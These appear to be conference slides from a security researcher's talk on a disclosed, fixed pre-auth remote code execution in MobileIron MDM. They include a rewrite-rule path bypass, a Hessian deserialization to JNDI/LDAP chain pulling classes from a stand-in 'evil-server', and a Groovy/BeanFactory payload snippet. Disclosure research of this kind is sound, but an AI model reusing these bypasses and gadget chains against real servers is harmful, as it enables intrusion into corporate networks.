### How I Hacked Facebook (Again!)
#### by Orange Tsai

**Orange Tsai**
- Principal Security Researcher at DEVCORE
- Captain of HITCON CTF Team
- 0-day Researcher, focusing on Web and Application Security
- Twitter: @orange_8361

**Meh Chang**
- Twitter: @mehqq_

**USA 2019**

---

**Disclaimer**
All vulnerabilities were reported through the proper legal channels and have been fixed.

---

### Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs

**Mobile Device Management (MDM) Solutions**
- VMware AirWatch
- MobileIron
- Microsoft Intune
- Trend Micro Mobile Security
- IBM MaaS 360
- Jamf Pro
- Citrix XenMobile
- Apple DEP/Profile Manager
- Sophos Mobile Control
- ManageEngine

**Why MobileIron?**
1. Over 20,000+ enterprises use it.
2. At least 15% of Fortune 500 companies use it, and some are exposed to the public internet.
3. It is the most widely used MDM solution in Taiwan.
4. Facebook uses it!

**Getting Started: How to Begin?**
- Initial setup and configuration can be challenging.

**Architecture**
- **Tomcat**
- **MI Server**
- **Apache (ports 443/8443)**
- **MI Protocol (port 9997)**
- **Reverse Proxy**
- **TLS Proxy**

**Vulnerability Discovery**
- The system had robust defenses, but it was not impossible to find a vulnerability.

**Vulnerability Breakdown**
- **Tomcat**
- **MI Server**
- **Reverse Proxy**
- **TLS Proxy**
- **Apache (ports 443/8443)**
- **MI Protocol (port 9997)**

**Web Service Uses Hessian!**
- **Manage Interface**
- **User Interface (Not Viable Due to Rewrite Rules)**

**Rewrite Rules**
```apache
RewriteRule ^/mifs/services/(.*)$ ... [R=307,L]
RewriteRule ^/mifs/services - [F]
```
- Attempted URL: `/mifs/services/fooService`
- Bypass: `/mifs/.;/services/fooService`

**Hessian Deserialization**
- **Java Unmarshaller Security**: A paper by @mbechler (May 2017)
- **Known Gadgets for Hessian Deserialization**:
  - **Spring-AOP**: JNDI Injection
  - **XBean**: JNDI Injection
  - **Resin**: JNDI Injection
  - **ROME**: Remote Code Execution (RCE)

**What is JNDI Injection?**
- JNDI (Java Naming and Directory Interface) is a Java API that allows developers to dynamically access objects.
- Example: `jdbc:mysql://localhost:3306/database`

**Why JNDI Injection?**
- **CVE-2015-2590**: Exploited by Pawn Storm (APT28, Fancy Bear)
- **Current Threat Landscape**: JNDI/LDAP Injection remains a significant risk.

**JNDI/LDAP Injection Process**
1. **Hessian Deserialization Triggers**:
   - A connection to an Evil LDAP Server
2. **Evil LDAP Server Replies**:
   - A Naming Reference with Factory and `URLCodeBase=http://evil-server/`
3. **Class Loader**:
   - Can't find the Factory Class
   - Fetches the class through the provided `URLCodeBase`
4. **Returns Evil Java Class**
5. **Result**: Remote Code Execution (RCE)

**Payload Flow**
- **Hacker** → **MobileIron** → **Evil Server**
  1. **LDAP Connection**
  2. **JNDI Reference**
  3. **HTTP Connection**
  4. **Evil Class**
  5. **RCE**

**Java Mitigation (October 2018, CVE-2018-3149)**
- JNDI/LDAP Injection mitigated, but new bypass techniques emerged.

**Bypassing JNDI/LDAP Injection Post-October 2018**
1. **Hessian Deserialization Triggers**:
   - A connection to an Evil LDAP Server
2. **Evil LDAP Server Replies**:
   - A Naming Reference with Factory and `URLCodeBase=http://evil-server/`
3. **Class Loader**:
   - Can't find the Factory Class
   - Fetches the class through the provided `URLCodeBase`
4. **Returns Evil Java Class**
5. **Result**: Remote Code Execution (RCE)

**Local Reference Bypass**
- **Local Factory**: `org.apache.naming.factory.BeanFactory` (Tomcat 6-8)
- **Example**:
  ```java
  ResourceRef ref = new ResourceRef(
      "tw.orange.User", null, "", "", true, 
      "org.apache.naming.factory.BeanFactory", null);
  ref.add(new StringRefAddr("forceString", "name=setUsername"));
  ref.add(new StringRefAddr("name", "orange"));
  ```

**New Groovy Chain**
- Works on all versions
- **Exploit with JNDI Bypass**:
  1. **Hessian Deserialization Triggers**:
     - A connection to an Evil LDAP Server
  2. **Evil LDAP Server Replies**:
     - Local Factory: `org.apache.naming.factory.BeanFactory`
     - Local Object Reference: `Groovy.shell.GroovyShell` with properties
       - `forceString` is `foo=evaluate`
       - `foo` is `"uname -a".execute()`
  3. **Factory Loads and Populates Object**
  4. **Result**: Remote Code Execution (RCE)

**Exploit with New Gadget**
1. **Hessian Deserialization Triggers**:
   - Local Groovy gadgets
2. **Result**: Remote Code Execution (RCE)

**Demo**
- [YouTube Demo](https://youtu.be/hGTLIIOb14A)

**Vulnerability Disclosure**
- Reported to: orange_8361
- PI:EMAIL

**Thanks!**
- For more information, visit [Orange's Blog](https://blog.orange.tw)